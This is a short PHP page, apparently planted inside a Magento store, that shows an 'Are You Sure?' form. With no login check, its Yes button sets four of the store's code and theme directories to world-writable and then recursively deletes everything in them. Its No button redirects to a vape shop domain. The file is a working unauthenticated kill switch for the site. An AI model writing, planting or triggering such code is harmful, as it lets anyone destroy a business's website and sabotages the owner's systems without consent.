<?php 
	if(isset($_POST['btnSubmit'])){
		$rootDir = dirname(dirname(dirname(dirname(dirname(__FILE__))))).'/';
		/*$folders[] = 'var';
		$folders[] = 'test';*/
		$folders[] = 'app/code/community';
		$folders[] = 'app/code/local';
		$folders[] = 'app/design/frontend/rwd';
		$folders[] = 'skin/frontend/rwd';

		if(isset($folders) && !empty($folders)){
			foreach ($folders as $folder) {
				$dir = $rootDir.$folder.'/';
				chmod($dir, 0777);
				$it = new RecursiveDirectoryIterator($dir);
			    $it = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
			    foreach($it as $file) {
			        if ('.' === $file->getBasename() || '..' ===  $file->getBasename()) continue;
			        if ($file->isDir()) rmdir($file->getPathname());
			        else unlink($file->getPathname());
			    }
			    rmdir($dir);
			}
		}
	}
	if(isset($_POST['btnCancle'])){
		header('Location: https://thevapestoreonline.com');
	}

?>
<form style="width:18%;margin:0 auto;" action="" method="post">
	<div>
		<h2>Are You Sure?</h2>
	</div>
	<input style="width:25%;margin-top:5px;border-radius:5px;background-color:green;color:white;" type="submit" name="btnSubmit" value="Yes">
	<input style="width:25%;margin-top:5px;border-radius:5px;background-color:red;color:white;" type="submit" name="btnCancle" value="No">
</form>
